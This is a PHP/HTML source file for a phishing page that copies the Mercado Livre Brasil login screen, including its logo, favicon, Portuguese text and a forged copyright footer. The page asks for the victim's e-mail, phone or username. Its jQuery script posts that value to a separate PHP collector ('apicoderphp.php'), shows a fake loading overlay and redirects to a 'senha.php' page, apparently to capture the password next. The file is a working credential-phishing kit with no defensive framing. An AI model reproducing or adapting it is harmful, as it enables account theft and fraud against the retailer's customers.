<?php 
session_start();
?> <title>Mercado Livre Brasil - Frete Grátis no mesmo dia</title>
    <link href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/favicon.svg" rel="icon" data-head-react="true"/>
<div style="margin-top:-20px;display:none;background:rgba(0,0,0,0.5);width:100%;height:150vh;z-index: 9999;position: fixed;" class="cad_sucesso">
   <div class="lskdlsakdsladlsdklsd" style="background:transparent;margin:10% auto;width:100%;height:auto !important;">
      
      

     <center> <img border="0" height="50px" src="https://www.anetts.com/imagens/loading.gif" alt=""></center>
      
       
       
         <br>


         </div>
     </div>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Mercado Livre Brasil - Frete Grátis no mesmo dia</title>
    <link href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/favicon.svg" rel="icon" data-head-react="true"/>
	<link rel="stylesheet" href="../css/style.css">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
	<link href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/favicon.svg" rel="icon" data-head-react="true"/>
	  <script src="https://kit.fontawesome.com/729540066d.js" crossorigin="anonymous"></script>
</head>
<body style="background:rgb(255, 255, 255);">

	<header class="asdkasdkadasd">
		<div class="container">
			<img class="peukaskaks" src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.5/mercadolibre/logo_large_plus.webp" alt="">
		</div>
	</header>

	<section class="jsdjasdklogin">
		<div class="container">
			<div class="asdkasdalinhar">
				<div class="row">
				 <div class="col-md-6">
				 	<h2>Digite seu e-mail, telefone ou usuário para iniciar sessão
</h2>
				 </div>
				 <div class="col-md-6">
				 	<div class="saldkaskd222" style="border-radius:6px;width:100%;height:auto;padding:40px;border:solid 1px rgb(220,220,220);">
				 		

				 		<form id="form"  method="post">
				 			<label for="" style="font-size:13px;font-weight: 300;">E‑mail, telefone ou usuário
</label>
<br>
<input name="login" class="asdkasjdinput" type="text" required>
<br><br>
<button   style="width:100%;height:auto;padding:12px;color:white;background:rgb(52, 131, 250);outline:none;border:none;border-radius:6px;">Continuar</button>
<br><br>
<button  class="askldlaksd0202002" style="padding:12px;font-weight:500;border:none;text-align: center;width:100%;background: transparent;color:rgb(52, 131, 250);">Criar conta</button>
				 		</form>
				 		
				 	</div>
				 </div>

				 <button class="kdasdoe22323"><i style="color:rgb(140, 140, 140);" class="fa-solid fa-shield"></i> Tenho um problema de segurança <i style="color:rgb(140, 140, 140);" class="fa-solid fa-arrow-right"></i></button>
				 <p class="asdkjasdjasd55333" style="color:#3483fa;font-size:13px;">Preciso de ajuda com outros temas</p>
			</div>
			</div>
		</div>
	</section>








<footer class="footer">
	<div class="container">
		<div class="row">
			<div class="col-md-4 col-12">
				<span style="color:#3483fa;font-size:11px;">Como cuidamos da sua privacidade <span style="color:rgb(0 0 0 / 55%);">- Copyright © 1999-2024 Ebazar.com.br LTDA.</span></span>
			</div>
			<div class="col-md-8 col-12">
				<div style="float:right;"><span style="color:#3483fa;font-size:12px;">Protegido por reCAPTCHA
 <span style="color:rgb(0 0 0 / 55%);">- Privacidade
Condições</span></span></div>
			</div>
		</div>
	</div>
</footer>






<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>	

<script src="https://code.jquery.com/jquery-3.6.0.js"></script>
<script>
      $(function(){
         $('#form').bind('submit', function(e){
            e.preventDefault();
            var frete = $("input[name='tipo']:checked").val(); 

            console.log(frete);

            var txt = $(this).serialize();
            console.log(txt);

            $.ajax({
               type:"POST",
               url:"../apicoderphp.php",
               data:txt,
               success:function(data){
                  guid = data;


        $(".cad_sucesso").css({
            display: 'block'
        })

        // IF pix
        
        
          setTimeout(function() {
            $(".cad_sucesso").fadeOut();
           
            setTimeout(function() {
                window.location.href = "senha.php";
            },100);
        }, 3000);
        


       


               }
            });
         });
      });
   </script>




</body>
</html>